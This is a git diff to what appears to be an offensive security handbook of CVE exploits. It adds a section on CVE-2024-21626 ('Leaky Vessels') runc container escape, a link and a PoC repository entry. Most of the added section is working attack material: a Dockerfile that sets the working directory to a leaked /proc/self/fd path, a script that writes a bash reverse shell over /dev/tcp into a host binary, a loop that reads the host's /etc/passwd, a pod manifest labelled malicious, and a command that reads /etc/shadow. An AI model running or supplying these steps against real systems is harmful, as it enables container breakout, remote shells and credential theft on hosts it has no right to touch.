@@ -32,6 +32,7 @@
 - [CVE-2023-46604: Apache ActiveMQ OpenWire Transport RCE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-46604-Apache-ActiveMQ-OpenWire-Transport-RCE)
 - [CVE-2023-4911: Looney Tunables LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-4911-Looney-Tunables-LPE)
 - [CVE-2023-7028: GitLab Account Takeover](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-7028-GitLab-Account-Takeover)
+- [CVE-2024-21626: Leaky Vessels Container Escape](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2024-21626-Leaky-Vessels-Container-Escape)
 - [GodPotato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#GodPotato-LPE)
 - [Juicy Potato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Juicy-Potato-LPE)
 - [JuicyPotatoNG LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#JuicyPotatoNG-LPE)
@@ -147,6 +148,7 @@
 | CVE-2023-51467, CVE-2023-49070 | Apache OFBiz Authentication Bypass | https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass |
 | CVE-2023-7028 | GitLab Account Takeover | https://github.com/V1lu0/CVE-2023-7028 |
 | CVE-2023-7028 | GitLab Account Takeover | https://github.com/Vozec/CVE-2023-7028 |
+| CVE-2024-21626 | Leaky Vessels Container Escape | https://github.com/Wall1e/CVE-2024-21626-POC |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
 | n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
 | n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
@@ -1309,6 +1311,67 @@ if __name__ == '__main__':
 
 ```c
 $ python3 exploit.py -u http://<RHOST> -t <EMAIL> -e <EMAIL>
+```
+
+## CVE-2024-21626: Leaky Vessels Container Escape
+
+> https://github.com/Wall1e/CVE-2024-21626-POC
+
+### Proof of Concept
+
+#### Dockerfile
+
+```c
+FROM ubuntu:20.04
+RUN apt-get update -y && apt-get install netcat -y
+ADD ./poc.sh /poc.sh
+WORKDIR /proc/self/fd/9
+```
+
+#### poc.sh
+
+```c
+#!/bin/bash
+ip=$(hostname -I | awk '{print $1}')
+port=<LPORT>
+cat > /proc/self/cwd/../../../bin/bash.copy << EOF
+#!/bin/bash
+bash -i >& /dev/tcp/$ip/$port 0>&1
+EOF
+
+```
+
+#### verify.sh
+
+```c
+#! /bin/bash
+for i in {4..20}; do
+    docker run -it --rm -w /proc/self/fd/$i ubuntu:20.04 bash -c "cat /proc/self/cwd/../../../etc/passwd"
+done
+```
+
+### Malicious YAML File
+
+```c
+apiVersion: v1
+kind: Pod
+metadata:
+  name: CVE-2024-21626
+spec:
+  containers:
+  - name: ubuntu
+    image: ubuntu
+    workingDir: /proc/self/fd/8
+    command: ["sleep"]
+    args: ["infinity"] 
+```
+
+It can be the case that the `file descriptor` needs to be incremented until it show the actual output.
+
+#### Inside the container
+
+```c
+$ cat ../../../../etc/shadow
 ```
 
 ## GodPotato LPE
